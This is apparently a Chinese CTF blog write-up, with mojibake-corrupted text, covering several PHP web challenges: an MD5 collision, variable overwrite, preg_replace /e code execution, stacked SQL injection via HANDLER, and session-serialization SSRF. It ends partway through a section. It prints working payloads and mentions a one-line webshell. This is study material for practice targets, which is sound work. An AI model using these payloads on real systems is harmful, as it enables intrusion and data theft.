<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;param2&#x3D;%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><ul>
<li>æºç æ³„éœ²</li>
<li>å˜é‡è¦†ç›–</li>
</ul>
<p>ä¸€ä¸ªåšå®¢é¡µé¢,å”¯ä¸€åŠŸèƒ½å°±æ˜¯ç•™è¨€æ¿,å…ˆæ‰«ä¸€ä¸‹ç›®å½•,å‘ç°äº†<code>.git/config</code> ç­‰,äºæ˜¯çŸ¥é“æ˜¯æºç æ³„éœ², ç„¶åç”¨GitHackä¸‹è½½æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line">$is = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">$handsome = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $x =&gt; $y) &#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $x =&gt; $y) &#123; <span class="comment">// $x = &#x27;yds&#x27; $y = &#x27;flag&#x27;</span></span><br><span class="line">    $$x = $$y; <span class="comment">// $$x å°±æ˜¯ $yds, $$yå°±æ˜¯ $flag, æœ€åå°±è¦†ç›–æˆä¸º $yds = $flag;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $x =&gt; $y) &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">&#x27;flag&#x27;</span>] === $x &amp;&amp; $x !== <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds); <span class="comment">// exit($yds) å°±è¦†ç›–ä¸º exit($flag); è¾“å‡ºflag</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($_POST[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span> || $_GET[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span> . $flag;</span><br></pre></td></tr></table></figure>

<p>å› ä¸ºæ˜¯å˜é‡è¦†ç›–å˜›.æ‰€ä»¥è¦å¾—åˆ°flag, å°±<strong>å¿…é¡»è®© handsome , yds æˆ–è€…is çš„å€¼ä¸º$flag</strong>,è¿™æ ·å°±ç›¸å½“äºexit($flag);</p>
<p>æœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯,ä¸ä¼ flag,è®©ä¸‹é¢è¿™æ®µä»£ç  æ‰§è¡Œ exit</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">&#x27;flag&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br></pre></td></tr></table></figure>

<p> <code>/?yds=flag</code> å³å¯</p>
<p>å¯å˜å˜é‡: <a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/language.variables.variable.php">https://www.php.net/manual/zh/language.variables.variable.php</a></p>
<h1 id="BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"><a href="#BJDCTF2020-ZJCTFï¼Œä¸è¿‡å¦‚æ­¤" class="headerlink" title="[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤"></a>[BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤</h1><p>å‰é¢çš„å†…å®¹å’ŒZJCTFçš„é€†è½¬æ€ç»´é‚£é“é¢˜å·®ä¸å¤š,<code>?text=php://input&amp;file=php://filter/convert.base64-encode/resource=next.php</code> å¹¶ä¸”POST å†…å®¹ä¸ºI have a dream , è¯»åˆ°next.php çš„æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">$_SESSION[<span class="string">&#x27;id&#x27;</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params">$re, $str</span>) // å®šä¹‰ä¸€ä¸ªå‡½æ•°,ç”¨äºæ­£åˆ™åŒ¹é…</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . $re . <span class="string">&#x27;)/ei&#x27;</span>, <span class="comment">// æ³¨æ„è¿™é‡Œæ˜¯ /e æ¨¡å¼,å¯ä»¥è¿›è¡Œä»£ç æ‰§è¡Œ</span></span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $str <span class="comment">//  åŒ¹é…strä¸­ç¬¦åˆæ¨¡å¼çš„</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ç”¨æ•°ç»„éå† æŠŠå˜é‡åä¼ é€’ç»™re,å˜é‡å€¼ä¼ é€’ç»™str</span></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str) . <span class="string">&quot;\n&quot;</span>; <span class="comment">// ç„¶åè¾“å‡º</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ <code>preg_replace()</code> ç”¨äº† /e æ¨¡å¼,<strong>å¯ä»¥æŠŠåŒ¹é…æ¥çš„å­—ç¬¦ä¸²å½“ä½œæ­£åˆ™è¡¨è¾¾å¼æ‰§è¡Œ</strong>,å³<code>strtolower(&quot;\\1&quot;)</code> è¿™éƒ¨åˆ†</p>
<p><code>\\1 å®é™…ä¸Šå°±æ˜¯ \1</code> (ç¬¬ä¸€ä¸ªæ˜¯ç”¨æ¥è½¬ä¹‰æ»´) ï¼Œè€Œ \1 åœ¨æ­£åˆ™è¡¨è¾¾å¼ä¸­æœ‰è‡ªå·±çš„å«ä¹‰ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ W3Cschool ä¸­å¯¹å…¶çš„æè¿°ï¼š</p>
<blockquote>
<p>åå‘å¼•ç”¨</p>
<p>å¯¹ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼æˆ–éƒ¨åˆ†æ¨¡å¼ ä¸¤è¾¹æ·»åŠ åœ†æ‹¬å· å°†å¯¼è‡´ç›¸å…³ åŒ¹é…å­˜å‚¨åˆ°ä¸€ä¸ªä¸´æ—¶ç¼“å†²åŒº  ä¸­ï¼Œæ‰€æ•è·çš„æ¯ä¸ªå­åŒ¹é…éƒ½æŒ‰ç…§åœ¨æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼ä¸­ä»å·¦åˆ°å³å‡ºç°çš„é¡ºåºå­˜å‚¨ã€‚ç¼“å†²åŒºç¼–å·ä» 1 å¼€å§‹ï¼Œæœ€å¤šå¯å­˜å‚¨ 99  ä¸ªæ•è·çš„å­è¡¨è¾¾å¼ã€‚<strong>æ¯ä¸ªç¼“å†²åŒºéƒ½å¯ä»¥ä½¿ç”¨ â€˜\nâ€™ è®¿é—®ï¼Œå…¶ä¸­ n ä¸ºä¸€ä¸ªæ ‡è¯†ç‰¹å®šç¼“å†²åŒºçš„ä¸€ä½æˆ–ä¸¤ä½åè¿›åˆ¶æ•°</strong>ã€‚</p>
</blockquote>
<p>æ‰€ä»¥è¿™é‡Œçš„ \1 å®é™…ä¸ŠæŒ‡å®šçš„æ˜¯ç¬¬ä¸€ä¸ªå­åŒ¹é…é¡¹</p>
<p>ç„¶å<strong>åœ¨PHPä¸­,å¯¹äºä¼ å…¥çš„éæ³•çš„$_GET æ•°ç»„å‚æ•°å,ä¼šå°†å…¶è½¬æ¢ä¸ºä¸‹åˆ’çº¿,å¯¼è‡´æ­£åˆ™åŒ¹é…å¤±æ•ˆ</strong></p>
<p>payload: <code>\S*=$&#123;phpinfo()&#125;</code> </p>
<p>ç„¶åç”¨è¿™ä¸ªå†™ä¸€å¥è¯, èšå‰‘è¿,æ‹¿flag. å­¦ä¹ çŸ¥è¯†å‚è€ƒèµ„æ–™äºŒ,å†™çš„æ¯”æˆ‘å¥½,ä¸å¤šè¯´äº† ğŸ˜„</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36340642/article/details/79352876">https://blog.csdn.net/qq_36340642/article/details/79352876</a>  å…³äºæ­£åˆ™è¡¨è¾¾å¼çš„ä¿®é¥°ç¬¦</p>
<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/145649.htm">æ·±å…¥ç ”ç©¶phpä¸­çš„preg_replace()/eæ¨¡å¼ä¸‹çš„å‘½ä»¤æ‰§è¡Œ</a></p>
<h1 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h1><ul>
<li>å †å æ³¨å…¥</li>
</ul>
<p>å¼ºç½‘æ¯æ”¹å˜è¿‡æ¥çš„</p>
<p><code>1&#39;;show databases;</code> </p>
<p><code>1&#39;;show tables from supersqli;</code>  å¾—åˆ°è¡¨ä¸º FlagHere å’Œ words</p>
<p><code>1&#39;;show columns from FlagHere;</code> å¾—åˆ°å­—æ®µä¸º flag ä½†æ˜¯é•¿åº¦åªæœ‰ 8ä½, æ‰€ä»¥åº”è¯¥ä¸æ˜¯è¿™ä¸ª,è½¬å›å»çœ‹ wordsè¡¨</p>
<p>å­—æ®µæœ‰ id data</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> preg_match(<span class="string">&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;</span>,$inject);</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œæ­£åˆ™ å¢åŠ äº† alter å’Œ rename </p>
<p>è¿™é‡Œç”¨é¢„ç¼–è¯‘çš„æ–¹å¼æ¥åšåšä¸å‡ºæ¥, å¯èƒ½ä¸Šæ¬¡ç”¨çš„æ˜¯strstr()å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„,è¿™æ¬¡å¯èƒ½ç”¨çš„æ˜¯stristr(),åŒºåˆ†å¤§å°å†™äº†, æ‰€ä»¥é€šè¿‡é¢„ç¼–è¯‘å’Œæ”¹è¡¨åçš„æ–¹æ³•éƒ½åšä¸å‡ºæ¥äº†.</p>
<p>çœ‹äº†å¤§ä½¬çš„WP, æ‰å‘ç°è¿˜æœ‰ç¬¬ä¸‰ç§æ–¹æ³•, åˆ©ç”¨MYSQL çš„æ–°ç‰¹æ€§<code>handler</code> </p>
<p><a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/handler.html">https://dev.mysql.com/doc/refman/8.0/en/handler.html</a> MYSQL æ–‡æ¡£</p>
<p><a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/handler.html">https://www.docs4dev.com/docs/zh/mysql/5.7/reference/handler.html</a> ä¸­æ–‡çš„ å“ˆå“ˆå“ˆ</p>
<p><code>HANDLER ... OPEN</code>è¯­å¥æ‰“å¼€ tableï¼Œä½¿ç”¨åç»­çš„<code>HANDLER ... READ</code> statements å¯ä»¥è®¿é—®å®ƒ;æ­¤ table object ä¸ä¼šè¢«å…¶ä»–ä¼šè¯å…±äº«ï¼Œå¹¶ä¸”åœ¨ session calls <code>HANDLER ... CLOSE</code>æˆ– session ç»ˆæ­¢ä¹‹å‰ä¸ä¼šå…³é—­ã€‚</p>
<p><code>HANDLER ... CLOSE</code>å…³é—­ç”¨<code>HANDLER ... OPEN</code>æ‰“å¼€çš„ tableã€‚</p>
<blockquote>
<p>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name READ FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡READ NEXTä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡ŒNEXTä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚</p>
</blockquote>
<p>å› æ­¤å¯ä»¥ç”¨è¿™ç§æ–¹æ³•æ¥å†™payload</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">OPEN</span>;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">READ</span> <span class="keyword">FIRST</span>;</span><br><span class="line"><span class="keyword">HANDLER</span> FlagHere <span class="keyword">CLOSE</span>;<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>tttttqlâ€¦. ä¸çŸ¥é“å°±ä¸çŸ¥é“æ€ä¹ˆåš(å…¶å®è¯´æ˜äº†ä¸€ç‚¹,ä¸ç®¡æ˜¯æ¸—é€è¿˜æ˜¯CTF,ä¿¡æ¯æœé›†æ°¸è¿œéƒ½æ˜¯ç¬¬ä¸€ä½), CTF For Learn!</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/JesseYoung/article/details/40785137">https://blog.csdn.net/JesseYoung/article/details/40785137</a> ( è¿™ç¯‡æ–‡ç« æ˜¯2014å¹´å°±)</p>
<h1 id="LCTF-2018-bestphpâ€™s-revenge"><a href="#LCTF-2018-bestphpâ€™s-revenge" class="headerlink" title="[LCTF 2018]bestphpâ€™s revenge"></a>[LCTF 2018]bestphpâ€™s revenge</h1><ul>
<li>åºåˆ—åŒ–æ³¨å…¥æ”»å‡»</li>
<li>PHP session å¼•æ“æœºåˆ¶ä¸åŒå¯¼è‡´çš„åºåˆ—åŒ–æ¼æ´</li>
<li>åŸé¢˜æ˜¯æœ‰hintçš„, hint: ååºåˆ—åŒ–</li>
<li>session ååºåˆ—åŒ– &gt; SoapClient æ‰§è¡Œä¸å­˜åœ¨çš„æ–¹æ³•è°ƒç”¨äº†__call  å¯¼è‡´ssrf &gt; å˜é‡è¦†ç›–bä¸ºcall_user_func è·å¾—cookie</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST); <span class="comment">// å›è°ƒå‡½æ•°,æ–°çš„å‡½æ•°åç”±GET çš„å‚æ•°å†³å®š, å‡½æ•°å†…å®¹ç”± POST çš„å‚æ•°å†³å®š</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>]; <span class="comment">// é€šè¿‡GET åˆ°çš„nameæ¥è®¾ç½®session</span></span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION); <span class="comment">// è¾“å‡ºsession çš„ç±»å‹å’Œå€¼</span></span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>); <span class="comment">// reset â€” å°†æ•°ç»„çš„å†…éƒ¨æŒ‡é’ˆæŒ‡å‘ç¬¬ä¸€ä¸ªå•å…ƒ</span></span><br><span class="line">call_user_func($b, $a); <span class="comment">// implode($a); implode() å‡½æ•°,å°†ä¸€ç»´æ•°ç»„è½¬åŒ–ä¸ºå­—ç¬¦ä¸²,ä½†æ˜¯è¿™æ ·è‚¯å®šå°±æµªè´¹äº†</span></span><br></pre></td></tr></table></figure>

<p>æ‹¿åˆ°é¢˜ä¸€åœ¨æƒ³è¿™ä¸ª<code>call_user_func()</code> æ˜¯ä¸æ˜¯å¯ä»¥ç”¨æ¥å†™ä¸ªåè°ƒåé—¨, çœ‹äº†Smi1e å¸ˆå‚…çš„æ–‡ç« æ‰å‘ç°è¿˜æœ‰ä¸€ä¸ªflag.php , ç„¶åæˆ‘å°±å»æ‰«äº†ä¸‹ç›®å½•, æœç„¶å­˜åœ¨â€¦. ä»¥ååšé¢˜ç¬¬äºŒä»¶äº‹å°±æ˜¯æ‰«ç›®å½• - . -</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start(); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>; </span><br><span class="line">$flag = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>; </span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>] === <span class="string">&quot;127.0.0.1&quot;</span>) &#123;</span><br><span class="line">    </span><br><span class="line">    $_SESSION[<span class="string">&#x27;flag&#x27;</span>] = $flag;</span><br><span class="line">&#125; </span><br><span class="line">only localhost can get flag!  <span class="comment">// SSRF</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆéœ€è¦æ˜ç¡®æ€è·¯,è¦è¾¾åˆ°æœ¬åœ°,å³å”¯ä¸€é€šè¿‡SSRF å»è®¿é—® flag.php é€šè¿‡å˜é‡è¦†ç›–è·å¾—sessionä¸­çš„flag</p>
<p>å…³é”®ç‚¹æ˜¯å¦‚ä½•å°†session åºåˆ—åŒ–å¼•æ“è¦†ç›–?</p>
<p><strong>åˆ©ç”¨å›è°ƒå‡½æ•°è¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilazeï¼Œæ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆåºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ï¼Œç„¶ååˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œè¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°call_user_funcï¼Œæ­¤æ—¶ç»“åˆæˆ‘åˆšå¼€å§‹æ‰€è¯´çš„å›è°ƒå‡½æ•°è°ƒç”¨Soapç±»çš„æœªçŸ¥æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•è¿›è¡ŒSSRFè®¿é—®flag.phpã€‚æŠŠflagå†™å…¥sessionï¼Œå†æŠŠsessionæ‰“å°å‡ºæ¥å³å¯</strong>  â€” å‚è€ƒèµ„æ–™2</p>
<h2 id="PHP-ä¸­çš„session-ååºåˆ—åŒ–æœºåˆ¶"><a href="#PHP-ä¸­çš„session-ååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="PHP ä¸­çš„session ååºåˆ—åŒ–æœºåˆ¶"></a>PHP ä¸­çš„session ååºåˆ—åŒ–æœºåˆ¶</h2><h3 id="sessionçš„å­˜å‚¨æœºåˆ¶"><a href="#sessionçš„å­˜å‚¨æœºåˆ¶" class="headerlink" title="sessionçš„å­˜å‚¨æœºåˆ¶"></a>sessionçš„å­˜å‚¨æœºåˆ¶</h3><p>phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹<strong>session.save_handler</strong>æ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚<br>å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„</p>
<p>æœ‰ä¸‰ç§æ–¹å¼</p>
<ul>
<li>é»˜è®¤ä½¿ç”¨php : æ ¼å¼ <code>é”®å|é”®å€¼(ç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼)</code></li>
<li>php_serialize: æ ¼å¼ ç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼</li>
<li>php_binary: é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦ + é”®å + ç»è¿‡åºåˆ—åŒ–å‡½æ•°å¤„ç†çš„å€¼</li>
</ul>
<p>åœ¨<code>php.ini</code> ä¸­æœ‰ä¸‰é¡¹é…ç½®: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">session.save_path&#x3D;&quot;&quot;   --è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„</span><br><span class="line">session.save_handler&#x3D;&quot;&quot; --è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼)</span><br><span class="line">session.auto_start   boolen --æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯,é»˜è®¤ä¸º0ä¸å¯åŠ¨</span><br><span class="line">session.serialize_handler   string --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–&#x2F;ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</span><br></pre></td></tr></table></figure>

<p>æˆ‘çš„phpstudy_proçš„ session æ–‡ä»¶å­˜æ”¾åœ¨extension/tmp/tmpç›®å½•</p>
<p>ç¬¬ä¸€ç§(é»˜è®¤php): </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// array(1) &#123; [&quot;name&quot;]=&gt; string(6) &quot;1FonlY&quot; &#125; </span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹session æ–‡ä»¶ : <code>name|s:6:&quot;1FonlY&quot;;</code> </p>
<p>ç¬¬äºŒç§: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,  <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span> <span class="comment">// array(1) &#123; [&quot;name&quot;]=&gt; string(6) &quot;1FonlY&quot; &#125; </span></span><br></pre></td></tr></table></figure>

<p><code>a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;1FonlY&quot;;&#125;</code> <code>a:1</code>æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚</p>
<p>ç¬¬ä¸‰ç§: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>,  <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">	session_start();</span><br><span class="line">	$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;1FonlY&#x27;</span> ;</span><br><span class="line">	var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>names:6:&quot;1FonlY&quot;;</code>  ä¸å¯æ˜¾çš„ä¸º<code>EOT</code>  ,<code>name</code>çš„é•¿åº¦ä¸º<code>4</code> 4åœ¨ASCII è¡¨ä¸­å°±æ˜¯ EOT</p>
<h3 id="session-åºåˆ—åŒ–æ³¨å…¥æ¼æ´"><a href="#session-åºåˆ—åŒ–æ³¨å…¥æ¼æ´" class="headerlink" title="session åºåˆ—åŒ–æ³¨å…¥æ¼æ´"></a>session åºåˆ—åŒ–æ³¨å…¥æ¼æ´</h3><blockquote>
